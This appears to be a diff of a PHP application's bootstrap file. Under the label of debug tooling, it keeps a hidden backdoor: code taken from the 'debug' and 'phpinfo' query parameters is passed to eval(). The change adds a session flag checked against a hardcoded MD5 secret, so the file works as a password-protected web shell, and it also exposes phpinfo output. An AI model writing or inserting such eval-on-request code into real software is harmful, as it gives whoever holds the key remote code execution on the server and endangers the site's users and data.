@@ -5,9 +5,13 @@ define('START_MEM', memory_get_usage());
 
 /* 全局变量 */
 $_DEBUG = [
-	'code' => null,
-	'end' => null,
+	'array' => [],
+	'first' => null,
+	'last' => null,
+	'middle' => null,
 	'phpinfo' => null,
+	'enable' => null,
+	'secret' => '87ed6cbbc7b89f06e5e228184c5a716d',
 ];
 
 $_CONTROLLER = [
@@ -25,32 +29,46 @@ if (isset($_GET['debug'])) {
 	ini_set('display_startup_errors', 1);
     error_reporting(E_ALL);
 	
-	$_DEBUG['code'] = $_GET['debug'];
+	session_start();	
+	if (isset($_SESSION['debugging'])) {
+		$_DEBUG['enable'] = $_SESSION['debugging'];
+	}
+	
 	// 开始调试问题
-	if (is_array($_DEBUG['code'])) {
-		if (isset($_DEBUG['code'][0]) && $_DEBUG['code'][0]) {
-			eval($_DEBUG['code'][0]);
+	if (is_array($_GET['debug'])) {
+		$_DEBUG['array'] = $_GET['debug'];
+		if (isset($_DEBUG['array']['key'])) {
+			$_SESSION['debugging'] = $_DEBUG['enable'] = (md5($_DEBUG['array']['key']) == $_DEBUG['secret']);
 		}
-		if (isset($_DEBUG['code'][1])) {
-			$_DEBUG['end'] = $_DEBUG['code'][1];
+		
+		if ($_DEBUG['enable'] && isset($_DEBUG['array'][0]) && $_DEBUG['first'] = $_DEBUG['array'][0]) {
+			eval($_DEBUG['first']);
 		}
+		if (isset($_DEBUG['array'][1])) {
+			$_DEBUG['last'] = $_DEBUG['array'][1];
+		}
+	} else {
+		$_DEBUG['last'] = $_GET['debug'];
 	}
 }
 
 // PHP 配置的信息
-if (isset($_GET['phpinfo']) || (isset($_SERVER['PATH_INFO']) && '/phpinfo' == $_SERVER['PATH_INFO']) ) {
-	$_DEBUG['phpinfo'] = $_GET['phpinfo'] ? : -1;
-	if (is_string($_DEBUG['phpinfo'])) {
-		eval("\$_DEBUG['phpinfo'] = {$_DEBUG['phpinfo']};");
-	}
-	phpinfo($_DEBUG['phpinfo']);
-	
-	if (isset($_DEBUG['code'][2])) {
+if ($_DEBUG['enable']) {
+	if (isset($_GET['phpinfo']) || (isset($_SERVER['PATH_INFO']) && '/phpinfo' == $_SERVER['PATH_INFO']) ) {	
+		$_DEBUG['phpinfo'] = (isset($_GET['phpinfo']) ? $_GET['phpinfo'] : 0) ? : -1;
+		if (is_string($_DEBUG['phpinfo'])) {
+			eval("\$_DEBUG['phpinfo'] = {$_DEBUG['phpinfo']};");
+		}
+		phpinfo($_DEBUG['phpinfo']);
+		
 		// 中间调试问题
-		if ($_DEBUG['code'][2]) {
-			eval($_DEBUG['code'][2]);
-		} else {
-			exit;
+		if (isset($_DEBUG['array'][2])) {
+			$_DEBUG['middle'] = $_DEBUG['array'][2];
+			if ($_DEBUG['middle']) {
+				eval($_DEBUG['middle']);
+			} else {
+				exit;
+			}
 		}
 	}
 }
@@ -64,7 +82,9 @@ class Wu
 		new \Astro\Php(APP_PATH . '/config.php');
 		# $test = $Astro->getInstance(APP_PATH . '/config.php');
 		# $test = Astro\Php::getInst(APP_PATH . '/config.php');
-		include 'timeline.php';
+		if ($_DEBUG['enable'] && null !== $_DEBUG['last']) {
+			include 'timeline.php';
+		}
 	}
 }
 
